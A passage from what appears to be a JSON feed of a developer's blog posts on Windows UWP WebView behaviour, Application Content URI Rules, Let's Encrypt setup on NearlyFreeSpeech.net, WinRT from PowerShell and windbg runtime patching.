getHtmlPrintDocumentSourceAsync to complete:\n  </p><pre><code>    function onPrintTaskRequested(printEvent) {    <br>        var printTask = printEvent.request.createPrintTask(\"Print Sample\", function (args) {<br>            const deferral = args.getDeferral();<br>            MSApp.getHtmlPrintDocumentSourceAsync(document).then(htmlPrintDocumentSource =&gt; {<br>                args.setSource(htmlPrintDocumentSource);<br>                deferral.complete();<br>            }, error =&gt; {<br>                console.error(\"Error: \" + error.message + \" \" + error.stack);<br>                deferral.complete();<br>            });<br>        });</code></pre></div></div>\n",
			"date_published": "2017-10-11T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2017-09/Win10+UWP+WebView+AddWebAllowedObject+details/",
			"url": "https://deletethis.net/dave/2017-09/Win10+UWP+WebView+AddWebAllowedObject+details/",
			"title": "Win10 UWP WebView AddWebAllowedObject details",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    The x-ms-webview HTML element has the void <a href=\"https://msdn.microsoft.com/en-us/library/windows/apps/dn926632.aspx\">addWebAllowedObject</a>(string name, any value) method and the webview\n    XAML element has the void <a href=\"https://docs.microsoft.com/en-us/uwp/api/windows.ui.xaml.controls.webview#Windows_UI_Xaml_Controls_WebView_AddWebAllowedObject_System_String_System_Object_\">AddWebAllowedObject</a>(String name,\n    Object value) method. The object parameter is projected into the webview’s top-level HTML document’s script engine as a new property on the global object with property name set to the name\n    parameter. It is not injected into the current document but rather it is projected during initialization of the next top-level HTML document to which the webview navigates.\n  </p><h2>\n    Lifetime\n  </h2><p>\n    If AddWebAllowedObject is called during a NavigationStarting event handler the object will be injected into the document resulting from the navigation corresponding to that event.\n  </p><p>\n    If AddWebAllowedObject is called outside of the NavigationStarting event handler it will apply to the navigation corresponding to the next explicit navigate method called on the webview or the\n    navigation corresponding to the next NavigationStarting event handler that fires, whichever comes first.\n  </p><p>\n    To avoid this potential race, you should use AddWebAllowedObject in one of two ways: 1. During a NavigationStarting event handler, 2. Before calling a Navigate method and without returning to the\n    main loop.\n  </p><p>\n    If called both before calling a navigate method and in the NavigationStarting event handler then the result is the aggregate of all those calls.\n  </p><p>\n    If called multiple times for the same document with the same name the last call wins and the previous are silently ignored.\n  </p><p>\n    If AddWebAllowedObject is called for a navigation and that navigation fails or redirects to a different URI, the AddWebAllowedObject call is silently ignored.\n  </p><p>\n    After successfully adding an object to a document, the object will no longer be projected once a navigation to a new document occurs.\n  </p><h2>\n    WinRT access\n  </h2><p>\n    If AddWebAllowedObject is called for a document with All WinRT access then projection will succeed and the object will be added.\n  </p><p>\n    If AddWebAllowedObject is called for a document which has a URI which has no declared WinRT access via ApplicationContentUriRules then Allow for web only WinRT access is given to that document.\n  </p><p>\n    If the document has Allow for web only WinRT access then projection will succeed only if the object’s runtimeclass has the Windows.Foundation.Metadata.AllowForWeb metadata attribute.\n  </p><h2>\n    Object requirements\n  </h2><p>\n    The object must implement the IAgileObject interface. Because the XAML and HTML webview elements run on ASTA view threads and the webview’s content’s JavaScript thread runs on another ASTA thread\n    a developer should not create their non-agile runtimeclass on the view thread. To encourage end developers to do this correctly we require the object implements IAgileObject.\n  </p><h2>\n    Property name\n  </h2><p>\n    The name parameter must be a valid JavaScript property name, otherwise the call will fail silently. If the name is already a property name on the global object, that property is overwritten if\n    the property is configurable. Non-configurable properties on the global object are not overwritten and the AddWebAllowedObject call fails silently. On success, the projected property is writable,\n    configurable, and enumerable.\n  </p><h2>\n    Errors\n  </h2><p>\n    Some errors as described above fail silently. Other issues, such as lack of IAgileObject or lack of the AllowForWeb attribute result in an error in the JavaScript developer console.\n  </p></div></div>\n",
			"date_published": "2017-09-04T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2017-06/Application+Content+URI+Rule+effects/",
			"url": "https://deletethis.net/dave/2017-06/Application+Content+URI+Rule+effects/",
			"title": "Application Content URI Rule effects",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Previously I described <a href=\"https://deletethis.net/dave/2017-05/Application+Content+URI+Rules+wildcard+syntax\">Application Content URI Rules (ACUR) parsing</a> and <a href=\"https://deletethis.net/dave/2017-06/Application+Content+URI+Rules+rule+ordering\">ACUR ordering</a>. This post describes what you get from putting a URI in ACUR.\n  </p><p>\n    URIs in the ACUR gain the following which is otherwise unavailable:\n  </p><ul><li>Geoloc API usage\n    </li><li>Audio and video capture API usage\n    </li><li>Pointer lock API usage\n    </li><li>Web notifications API usage\n    </li><li>IndexedDB API usage\n    </li><li>Clipboard API usage\n    </li><li>window.external.notify access from within webview\n    </li><li>window.close the primary window\n    </li><li>Top level navigation in the primary window\n    </li><li>Cross origin XHR and fetch to ms-appx(-web) scheme URIs\n    </li><li>Cross origin dirtied canvas read access if dirtied by ms-appx(-web) scheme URIs\n    </li><li>Cross origin text track for video element for tracks from ms-appx(-web) scheme URIs\n    </li></ul><p>\n    URIs in the ACUR that also have full WinRT access additionally gain the following:\n  </p><ul><li>Cross origin XHR and fetch\n    </li><li>Cross origin dirtied canvas read access\n    </li><li>Cross origin text track for video element\n    </li><li>Local audio and video WinRT plugins work with media elements\n    </li></ul></div></div>\n",
			"date_published": "2017-06-30T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2017-06/JavaScript+Microsoft+Store+app+StartPage/",
			"url": "https://deletethis.net/dave/2017-06/JavaScript+Microsoft+Store+app+StartPage/",
			"title": "JavaScript Microsoft Store app StartPage",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    JavaScript Microsoft Store apps have some details related to activation that are specific to JavaScript Store apps and that are poorly documented which I’ll describe here.\n  </p><h2>\n    StartPage syntax\n  </h2><p>\n    The StartPage attributes in the AppxManifest.xml (<a href=\"https://docs.microsoft.com/en-us/uwp/schemas/appxpackage/appxmanifestschema/element-application\">Package/Applications/Application/@StartPage</a>, <a href=\"https://docs.microsoft.com/en-us/uwp/schemas/appxpackage/appxmanifestschema/element-1-extension\">Package/Applications/Extensions/Extension/@StartPage</a>) define the HTML page entry point for\n    that kind of activation. That is, Application/@StartPage defines the entry point for tile activation, Extension[@Category=\"windows.protocol\"]/@StartPage defines the entry point for URI handling\n    activation, etc. There are two kinds of supported values in StartPage attributes: relative Windows file paths and absolute URIs. If the attribute doesn’t parse as an absolute URI then it is\n    instead interpreted as relative Windows file path.\n  </p><p>\n    This implies a few things that I’ll declare explicitly here. Windows file paths, unlike URIs, don’t have a query or fragment, so if you are using a relative Windows file path for your StartPage\n    attribute you cannot include anything like ‘?param=value’ at the end. Absolute URIs use percent-encoding for reserved characters like ‘%’ and ‘#’. If you have a ‘#’ in your HTML filename then you\n    need to percent-encode that ‘#’ for a URI and not for a relative Windows file path.\n  </p><p>\n    If you specify a relative Windows file path, it is turned into an ms-appx URI by changing all backslashes to forward slashes, percent-encoding reserved characters, and combining the result with a\n    base URI of ms-appx:///. Accordingly the relative Windows file paths are relative to the root of your package. If you are using a relative Windows file path as your StartPage and need to switch\n    to using a URI so you can include a query or fragment, you can follow the same steps above.\n  </p><h2>\n    StartPage validity\n  </h2><p>\n    The validity of the StartPage is not determined before activation. If the StartPage is a relative Windows file path for a file that doesn’t exist, or an absolute URI that is not in the\n    Application Content URI Rules, or something that doesn’t parse as a Windows file path or URI, or otherwise an absolute URI that fails to resolve (404, bad hostname, etc etc) then the JavaScript\n    app will navigate to the app’s navigation error page (perhaps more on that in a future blog post). Just to call it out explicitly because I have personally accidentally done this: StartPage URIs\n    are not automatically included in the Application Content URI Rules and if you forget to include your StartPage in your ACUR you will always fail to navigate to that StartPage.\n  </p><h2>\n    StartPage navigation\n  </h2><p>\n    When your app is activated for a particular activation kind, the StartPage value from the entry in your app’s manifest that corresponds to that activation kind is used as the navigation target.\n    If the app is not already running, the app is activated, navigated to that StartPage value and then the <code>Windows.UI.WebUI.WebUIApplication activated</code> event is fired (more details on\n    the order of various events in a moment). If, however, your app is already running and an activation occurs, we navigate or don’t navigate to the corresponding StartPage depending on the current\n    page of the app. Take the app’s current top level document’s URI and if after removing the fragment it already matches the StartPage value then we won’t navigate and will jump straight to firing\n    the WebUIApplication activated event.\n  </p><p>\n    Since navigating the top-level document means destroying the current JavaScript engine instance and losing all your state, this behavior might be a problem for you. If so, you can use the\n    <code>MSApp.pageHandlesAllApplicationActivations(true)</code> API to always skip navigating to the StartPage and instead always jump straight to firing the WebUIApplication activated event. This\n    does require of course that all of your pages all handle all activation kinds about which any part of your app cares.\n  </p></div></div>\n",
			"date_published": "2017-06-22T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2017-06/Application+Content+URI+Rules+rule+ordering/",
			"url": "https://deletethis.net/dave/2017-06/Application+Content+URI+Rules+rule+ordering/",
			"title": "Application Content URI Rules rule ordering",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><a href=\"https://docs.microsoft.com/en-us/uwp/schemas/appxpackage/appxmanifestschema/element-applicationcontenturirules\">Application Content URI Rules</a> (ACUR from now on) defines the bounds on\n    the web that make up a Microsoft Store application. The previous blog post discussed <a href=\"https://deletethis.net/dave/2017-05/Application+Content+URI+Rules+wildcard+syntax\">the syntax of the\n    Rule's Match attribute</a> and this time I'll write about the interactions between the Rules elements.\n  </p><h2>\n    Order\n  </h2><p>\n    A single ApplicationContentUriRules element may have up to 100 Rule child elements. When determining if a navigation URI matches any of the ACUR the last Rule in the list with a matching match\n    wildcard URI is used. If that Rule is an include rule then the navigation URI is determined to be an application content URI and if that Rule is an exclude rule then the navigation rule is not an\n    application content URI. For example:\n  </p><pre><code>Rule Type='include' Match='https://example.com/'/<br>Rule Type='exclude' Match='https://example.com/'/<br></code></pre><p>\n    Given the above two rules in that order, the navigation URI https://example.com/ is not an application content URI because the last matching rule is the exclude rule. Reverse the order of the\n    rules and get the opposite result.\n  </p><h2>\n    WindowsRuntimeAccess\n  </h2><p>\n    In addition to determining if a navigation URI is application content or not, a Rule may also confer varying levels of WinRT access via the optional WindowsRuntimeAccess attribute which may be\n    set to 'none', 'allowForWeb', or 'all'. If a navigation URI matches multiple different include rules only the last rule is applied even as it applies to the WindowsRuntimeAccess attribute. For\n    example:\n  </p><pre><code>Rule Type='include' Match='https://example.com/' WindowsRuntimeAccess='none'/<br>Rule Type='include' Match='https://example.com/' WindowsRuntimeAccess='all'/<br></code></pre><p>\n    Given the above two rules in that order, the navigation URI https://example.com/ will have access to all WinRT APIs because the last matching rule wins. Reverse the rule order and the navigation\n    URI https://example.com/ will have no access to WinRT. There is no summation or combining of multiple matching rules - only the last matching rule wins.\n  </p></div></div>\n",
			"date_published": "2017-06-01T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2017-05/Application+Content+URI+Rules+wildcard+syntax/",
			"url": "https://deletethis.net/dave/2017-05/Application+Content+URI+Rules+wildcard+syntax/",
			"title": "Application Content URI Rules wildcard syntax",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><a href=\"https://docs.microsoft.com/en-us/uwp/schemas/appxpackage/appxmanifestschema/element-applicationcontenturirules\">Application Content URI Rules</a> (ACUR from now on) defines the bounds of\n    the web that make up the Microsoft Store application. Package content via the ms-appx URI scheme is automatically considered part of the app. But if you have content on the web via http or https\n    you can use ACUR to declare to Windows that those URIs are also part of your application. When your app navigates to URIs on the web those URIs will be matched against the ACUR to determine if\n    they are part of your app or not. The documentation for how matching is done on the wildcard URIs in the ACUR Rule elements is not very helpful on MSDN so here are some notes.\n  </p><h2>\n    Rules\n  </h2><p>\n    You can have up to 100 Rule XML elements per ApplicationContentUriRules element. Each has a Match attribute that can be up to 2084 characters long. The content of the Match attribute is parsed\n    with <a href=\"https://msdn.microsoft.com/en-us/library/ms775098(v=vs.85).aspx\">CreateUri</a> and when matching against URIs on the web additional wildcard processing is performed. I’ll call the\n    URI from the ACUR Rule the rule URI and the URI we compare it to found during app navigation the navigation URI.\n  </p><p>\n    The rule URI is matched to a navigation URI by URI component: scheme, username, password, host, port, path, query, and fragment. If a component does not exist on the rule URI then it matches any\n    value of that component in the navigation URI. For example, a rule URI with no fragment will match a navigation URI with no fragment, with an empty string fragment, or a fragment with any value\n    in it.\n  </p><h2>\n    Asterisk\n  </h2><p>\n    Each component except the port may have up to 8 asterisks. Two asterisks in a row counts as an escape and will match 1 literal asterisk. For scheme, username, password, query and fragment the\n    asterisk matches whatever it can within the component.\n  </p><h2>\n    Host\n  </h2><p>\n    For the host, if the host consists of exactly one single asterisk then it matches anything. Otherwise an asterisk in a host only matches within its domain name label. For example,\n    http://*.example.com will match http://a.example.com/ but not http://b.a.example.com/ or http://example.com/. And http://*/ will match http://example.com, http://a.example.com/, and\n    http://b.a.example.com/. However the Store places restrictions on submitting apps that use the http://* rule or rules with an asterisk in the second effective domain name label. For example,\n    http://*.com is also restricted for Store submission.\n  </p><h2>\n    Path\n  </h2><p>\n    For the path, an asterisk matches within the path segment. For example, http://example.com/a/*/c will match http://example.com/a/b/c and http://example.com/a//c but not http://example.com/a/b/b/c\n    or http://example.com/a/c\n  </p><p>\n    Additionally for the path, if the path ends with a slash then it matches any path that starts with that same path. For example, http://example.com/a/ will match http://example.com/a/b and\n    http://example.com/a/b/c/d/e/, but not http://example.com/b/.\n  </p><p>\n    If the path doesn’t end with a slash then there is no suffix matching performed. For example, http://example.com/a will match only http://example.com/a and no URIs with a different path.\n  </p><p>\n    As a part of parsing the rule URI and the navigation URI, CreateUri will perform URI normalization and so the hostname and scheme will be made lower case (casing matters in all other parts of the\n    URI and case sensitive comparisons will be performed), IDN normalization will be performed, ‘.’ and ‘..’ path segments will be resolved and other normalizations as described in the CreateUri\n    documentation.\n  </p></div></div>\n",
			"date_published": "2017-05-31T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-11/Let-s+Encrypt+NearlyFreeSpeech.net+Update/",
			"url": "https://deletethis.net/dave/2016-11/Let-s+Encrypt+NearlyFreeSpeech.net+Update/",
			"title": "Let&#39;s Encrypt NearlyFreeSpeech.net Update",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Since I had last <a href=\"https://deletethis.net/dave/2016-02/Let%27s+Encrypt+NearlyFreeSpeech.net+Setup\">posted about using Let's Encrypt with NearlyFreeSpeech</a>, NFS has changed their process\n    for setting TLS info. Instead of putting the various files in /home/protected/ssl and submitting an assistance request, now there is a command to submit the certificate info and a webpage for\n    submitting the certificate info.\n  </p><p>\n    The webpage is <code>https://members.nearlyfreespeech.net/{username}/sites/{sitename}/add_tls</code> and has a textbox for you to paste in all the cert info in PEM form into the textbox. The\n    domain key, the domain certificate, and the Let's Encrypt intermediate cert must be pasted into the textbox and submitted.\n  </p><p>\n    Alternatively, that same info may be provided as standard input to <code>nfsn -i set-tls</code></p><p>\n    To renew my certificate with the updated NFS process I followed the commands from <a href=\"https://twitter.com/tehnicaorg\">Andrei Damian-Fekete</a>'s script which depends on <a href=\"https://github.com/diafygi/acme-tiny\">acme_tiny.py</a>:\n  </p><pre><code>python acme_tiny.py --account-key account.key --csr domain.csr --acme-dir /home/public/.well-known/acme-challenge/ &gt; signed.crt<br>wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &gt; intermediate.pem<br>cat domain.key signed.crt intermediate.pem &gt; chained.pem<br>nfsn -i set-tls &lt; chained.pem</code></pre>Because\n  my certificate had already expired I needed to comment out the section in acme_tiny.py that validates the challenge file. The filenames in the above map to the following:\n  <ul><li>signed.crt is the Let's Encrypt provided certificate\n    </li><li>account.key is the user private key registered with LE\n    </li><li>domain.csr is the cert request\n    </li><li>domain.key is the key for the domain cert\n    </li></ul></div></div>\n",
			"date_published": "2016-11-05T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-11/Parsing+WinMD+with+.NET+reflection+APIs/",
			"url": "https://deletethis.net/dave/2016-11/Parsing+WinMD+with+.NET+reflection+APIs/",
			"title": "Parsing WinMD with .NET reflection APIs",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Parsing WinMD files, the containers of WinRT API metadata, is relatively simple using the appropriate .NET reflection APIs. However, figuring out which reflection APIs to use is not obvious. I've\n    got a completed <a href=\"https://github.com/david-risney/WinMDGraph/blob/master/WinMDTypes.cs\">C sharp class parsing WinMD files</a> that you can check out for reference.\n  </p><p>\n    Use <code><a href=\"https://msdn.microsoft.com/en-us/library/system.reflection.assembly.reflectiononlyload(v=vs.110).aspx\">System.Reflection.Assembly.ReflectionOnlyLoad</a></code> to load the\n    WinMD file. Don't use the normal load methods because the WinMD files contain only metadata. This will load up info about APIs defined in that WinMD, but any references to types outside of that\n    WinMD including types found in the normal OS system WinMD files must be resolved by the app code via the <code><a href=\"https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.windowsruntime.windowsruntimemetadata.reflectiononlynamespaceresolve(v=vs.110).aspx\">System.Reflection.InteropServices.WindowsRuntimeMetadata.ReflectionOnlyNamespaceResolve</a></code>\n    event.\n  </p><p>\n    In this event handler you must resolve the unknown namespace reference by adding an assembly to the NamespaceResolveEventArgs's ResolvedAssemblies property. If you're only interested in OS system\n    WinMD files you can use <code><a href=\"https://msdn.microsoft.com/en-us/library/hh138431(v=vs.110).aspx\">System.Reflection.InteropServices.WindowsRuntimeMetadata.ResolveNamespace</a></code> to\n    turn a namespace into the expected OS system WinMD path and turn that path into an assembly with ReflectionOnlyLoad.\n  </p></div></div>\n",
			"date_published": "2016-11-02T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-08/WPAD+Server+Fiddler+Extension+Source/",
			"url": "https://deletethis.net/dave/2016-08/WPAD+Server+Fiddler+Extension+Source/",
			"title": "WPAD Server Fiddler Extension Source",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I've put my <a href=\"https://github.com/david-risney/WpadServerFiddlerExtension\">WPAD Fiddler extension source</a> and the <a href=\"https://github.com/david-risney/WpadServerFiddlerExtension/releases\">installer</a> on GitHub.\n  </p><p>\n    Six years ago I made a WPAD DHCP server Fiddler extension (described <a href=\"https://deletethis.net/dave/2010-01/WPAD+Server+Fiddler+Extension\">previously</a> and <a href=\"https://deletethis.net/dave/2011-06/WPAD+Server+Fiddler+Extension+Update+v1.0.1\">previously</a>). The extension runs a WPAD DHCP server telling any clients that connect to connect to the running\n    Fiddler instance. I've finally got around to putting the source on GitHub. I haven't touched it in five or so years so this is either for posterity or education or something.\n  </p></div></div>\n",
			"date_published": "2016-08-05T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-06/Data+breakpoints+in+JavaScript/",
			"url": "https://deletethis.net/dave/2016-06/Data+breakpoints+in+JavaScript/",
			"title": "Data breakpoints in JavaScript",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    The other day I had to debug a JavaScript UWA that was failing when trying to use an undefined property. In a previous OS build this code would run and the property was defined. I wanted\n    something similar to windbg/cdb's ba command that lets me set a breakpoint on read or writes to a memory location so I could see what was creating the object in the previous OS build and what\n    that code was doing now in the current OS build. I couldn't find such a breakpoint mechanism in Visual Studio or F12 so I wrote a little script to approximate <a href=\"https://gist.github.com/david-risney/af6f7912ea171b9076d3ba3ebd54a355\">JavaScript data breakpoints</a>.\n  </p><script src=\"https://gist.github.com/david-risney/af6f7912ea171b9076d3ba3ebd54a355.js\"></script><p>\n    The script creates a stub object with a getter and setter. It actually performs the get or set but also calls debugger; to break in the debugger. In order to handle my case of needing to break\n    when window.object1.object2 was created or accessed, I further had it recursively set up such stub objects for the matching property names.\n  </p><p>\n    Its not perfect because it is an enumerable property and shows up in hasOwnProperty and likely other places. But for your average code that checks for the existence of a property via if\n    (object.property) it works well.\n  </p></div></div>\n",
			"date_published": "2016-06-17T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-06/WinRT+Toast+from+PowerShell/",
			"url": "https://deletethis.net/dave/2016-06/WinRT+Toast+from+PowerShell/",
			"title": "WinRT Toast from PowerShell",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I've made a <a href=\"https://github.com/david-risney/PoshWinRT/blob/master/Show-Toast.ps1\">PowerShell script to show system toast notifications</a> with WinRT and PowerShell. Along the way I\n    learned several interesting things.\n  </p><p>\n    First off calling WinRT from PowerShell involves a strange syntax. If you want to use a class you write [-Class-,-Namespace-,ContentType=WindowsRuntime] first to tell PowerShell about the type.\n    For example here I create a ToastNotification object:\n  </p><pre><code>[void][Windows.UI.Notifications.ToastNotification,Windows.UI.Notifications,ContentType=WindowsRuntime];<br>$toast = New-Object Windows.UI.Notifications.ToastNotification -ArgumentList $xml;</code></pre>And\n  here I call the static method CreateToastNotifier on the ToastNotificationManager class:\n  <pre><code>[void][Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime];<br>$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AppUserModelId);</code></pre>With\n  this I can call WinRT methods and this is enough to show a toast but to handle the click requires a little more work.\n  <p>\n    To handle the user clicking on the toast I need to listen to the Activated event on the Toast object. However Register-ObjectEvent doesn't handle WinRT events. To work around this I created a\n    <a href=\"https://github.com/david-risney/PoshWinRT/blob/master/PoshWinRT/EventWrapper.cs\">.NET event wrapper class</a> to turn the WinRT event into a .NET event that Register-ObjectEvent can\n    handle. This is based on <a href=\"https://rkeithhill.wordpress.com/2013/09/30/calling-winrt-async-methods-from-windows-powershell/\">Keith Hill's blog post on calling WinRT async methods in\n    PowerShell</a>. With the event wrapper class I can run the following to subscribe to the event:\n  </p><pre><code>function WrapToastEvent {<br>    param($target, $eventName);<br><br>    Add-Type -Path (Join-Path $myPath \"PoshWinRT.dll\")<br>    $wrapper = new-object \"PoshWinRT.EventWrapper[Windows.UI.Notifications.ToastNotification,System.Object]\";<br>    $wrapper.Register($target, $eventName);<br>}<br><br>[void](Register-ObjectEvent -InputObject (WrapToastEvent $toast \"Activated\") -EventName FireEvent -Action { <br>    ...<br>});</code></pre><p>\n    To handle the Activated event I want to put focus back on the PowerShell window that created the toast. To do this I need to call the Win32 function SetForegroundWindow. Doing so from PowerShell\n    is surprisingly easy. First you must tell PowerShell about the function:\n  </p><pre><code>Add-Type @\"<br>    using System;<br>    using System.Runtime.InteropServices;<br>    public class PInvoke {<br>        [DllImport(\"user32.dll\")] [return: MarshalAs(UnmanagedType.Bool)]<br>        public static extern bool SetForegroundWindow(IntPtr hwnd);<br>    }<br>\"@</code></pre>Then\n  to call:\n  <pre><code>[PInvoke]::SetForegroundWindow((Get-Process -id $myWindowPid).MainWindowHandle);</code></pre><p>\n    But figuring out the HWND to give to SetForegroundWindow isn't totally straight forward. Get-Process exposes a MainWindowHandle property but if you start a cmd.exe prompt and then run PowerShell\n    inside of that, the PowerShell process has 0 for its MainWindowHandle property. We must follow up process parents until we find one with a MainWindowHandle:\n  </p><pre><code>$myWindowPid = $pid;<br>while ($myWindowPid -gt 0 -and (Get-Process -id $myWindowPid).MainWindowHandle -eq 0) {<br>    $myWindowPid = (gwmi Win32_Process -filter \"processid = $($myWindowPid)\" | select ParentProcessId).ParentProcessId;<br>}</code></pre></div></div>\n",
			"date_published": "2016-06-15T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-06/Windows+Store+App+WebView+Cross+Origin+XMLHttpRequest+Behavior/",
			"url": "https://deletethis.net/dave/2016-06/Windows+Store+App+WebView+Cross+Origin+XMLHttpRequest+Behavior/",
			"title": "Windows Store App WebView Cross Origin XMLHttpRequest Behavior",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    TL;DR: Web content in a JavaScript Windows Store app or WebView in a Windows Store app that has full access to WinRT also gets to use XHR unrestricted by cross origin checks.\n  </p><p>\n    By default web content in a WebView control in a Windows Store App has the same sort of limitations as that web content in a web browser. However, if you give the URI of that web content full\n    access to WinRT, then the web content also gains the ability to use XMLHttpRequest unrestricted by cross origin checks. This means no CORS checks and no OPTIONS requests. This only works if the\n    web content's URI matches a Rule in the ApplicationContentUriRules of your app's manifest and that Rule declares WindowsRuntimeAccess=\"all\". If it declares WinRT access as 'None' or\n    'AllowForWebOnly' then XHR acts as it normally does.\n  </p><p>\n    In terms of security, if you've already given a page access to all of WinRT which includes the HttpRequest class and other networking classes that don't perform cross origin checks, then allowing\n    XHR to skip CORS doesn't make things worse.\n  </p></div></div>\n",
			"date_published": "2016-06-02T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-03/WinRT+Launcher+API+in+PowerShell/",
			"url": "https://deletethis.net/dave/2016-03/WinRT+Launcher+API+in+PowerShell/",
			"title": "WinRT Launcher API in PowerShell",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  You can call WinRT APIs from PowerShell. Here's a short example using the WinRT Launcher API:\n  <pre><code>[Windows.System.Launcher,Windows.System,ContentType=WindowsRuntime]<br>$uri = New-Object System.Uri \"http://example.com/\"<br>[Windows.System.Launcher]::LaunchUriAsync($uri)</code></pre>Note\n  that like using WinRT in .NET, you use the System.Uri .NET class instead of the Windows.Foundation.Uri WinRT class which is not projected and under the covers the system will convert the System.Uri\n  to a Windows.Foundation.Uri.\n</div></div>\n",
			"date_published": "2016-03-31T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-02/Cdb-Windbg+Commands+for+Runtime+Patching/",
			"url": "https://deletethis.net/dave/2016-02/Cdb-Windbg+Commands+for+Runtime+Patching/",
			"title": "Cdb/Windbg Commands for Runtime Patching",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    You can use conditional breakpoints and debugging commands in windbg and cdb that together can amount to effectively patching a binary at runtime. This can be useful if you have symbols but you\n    can't easily rebuild the binary. Or if the patch is small and the binary requires a great deal of time to rebuild.\n  </p><h2>\n    Skipping code\n  </h2><p>\n    If you want to skip a chunk of code you can set a breakpoint at the start address of the code to skip and set the breakpoint's command to change the instruction pointer register to point to the\n    address at the end of the code to skip and go. Voila you're skipping over that code now. For example:\n  </p><pre><code>bp 0x6dd6879b \"r @eip=0x6dd687c3 ; g\"</code></pre><h2>\n    Changing parameters\n  </h2><p>\n    You may want to modify parameters or variables and this is simple of course. In the following example a conditional breakpoint ANDs out a bit from dwFlags. Now when we run its as if no one is\n    passing in that flag.\n  </p><pre><code>bp wiwi!RelativeCrack \"?? dwFlags &amp;= 0xFDFFFFFF;g\"</code></pre><p>\n    Slightly more difficult is to modify string values. If the new string length is the same size or smaller than the previous, you may be able to modify the string value in place. But if the string\n    is longer or the string memory isn't writable, you'll need a new chunk of memory into which to write your new string. You can use .dvalloc to allocate some memory and ezu to write a string into\n    the newly allocated memory. In the following example I then overwrite the register containing the parameter I want to modify:\n  </p><pre><code>.dvalloc 100<br>ezu 000002a9`d4eb0000 \"mfcore.dll\"<br>r rcx = 000002a9`d4eb0000</code></pre><h2>\n    Calling functions\n  </h2><p>\n    You can also use .call to actually make new calls to methods or functions. Read more about that on the Old New Thing: <a href=\"https://blogs.msdn.microsoft.com/oldnewthing/20070427-00/?p=27083/\">Stupid debugger tricks: Calling functions and methods</a>. Again, all of this can be used in a breakpoint command to\n    effectively patch a binary.\n  </p></div></div>\n",
			"date_published": "2016-02-08T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2016-02/Let-s+Encrypt+NearlyFreeSpeech.net+Setup/",
			"url": "https://deletethis.net/dave/2016-02/Let-s+Encrypt+NearlyFreeSpeech.net+Setup/",
			"title": "Let&#39;s Encrypt NearlyFreeSpeech.net Setup",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    2016-Nov-5: <a href=\"https://deletethis.net/dave/2016-11/Let%27s+Encrypt+NearlyFreeSpeech.net+Update\">Updated post</a> on using Let's Encrypt with NearlyFreeSpeech.net\n  </p><p>\n    I use NearlyFreeSpeech.net for my webhosting for my personal website and I've just finished setting up TLS via Let's Encrypt. The process was slightly more complicated than what you'd like from\n    Let's Encrypt. So for those interested in doing the same on NearlyFreeSpeech.net, I've taken the following notes.\n  </p><p>\n    The standard Let's Encrypt client requires su/sudo access which is not available on NearlyFreeSpeech.net's servers. Additionally NFSN's webserver doesn't have any Let's Encrypt plugins installed.\n    So I used the <a href=\"https://github.com/diafygi/letsencrypt-nosudo\">Let's Encrypt Without Sudo client</a>. I followed the instructions listed on the tool's page with the addition of providing\n    the \"--file-based\" parameter to sign_csr.py.\n  </p><p>\n    One thing the script doesn't produce is the chain file. But this topic \"<a href=\"https://members.nearlyfreespeech.net/forums/viewtopic.php?t=8457\">Let's Encrypt - Quick HOWTO for NSFN</a>\" covers\n    how to obtain that:\n  </p><pre><code>curl -o domain.chn https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem</code></pre><p>\n    Now that you have all the required files, on your NFSN server make the directory /home/protected/ssl and copy your files into it. This is described in the NFSN topic <a href=\"https://members.nearlyfreespeech.net/faq?q=TLSSetup#TLSSetup\">provide certificates to NFSN</a>. After copying the files and setting their permissions as described in the previous link you submit\n    an assistance request. For me it was only 15 minutes later that everything was setup.\n  </p><p>\n    After enabling HTTPS I wanted to have all HTTP requests redirect to HTTPS. The normal Apache documentation on how to do this doesn't work on NFSN servers. Instead the NFSN FAQ describes it in\n    \"<a href=\"https://members.nearlyfreespeech.net/faq?q=EnforceSSL#EnforceSSL\">redirect http to https and HSTS</a>\". You use the X-Forwarded-Proto instead of the HTTPS variable because of how NFSN's\n    virtual hosting is setup.\n  </p><pre><code>RewriteEngine on<br>RewriteCond %{HTTP:X-Forwarded-Proto} !https<br>RewriteRule ^.*$ https://%{SERVER_NAME}%{REQUEST_URI} 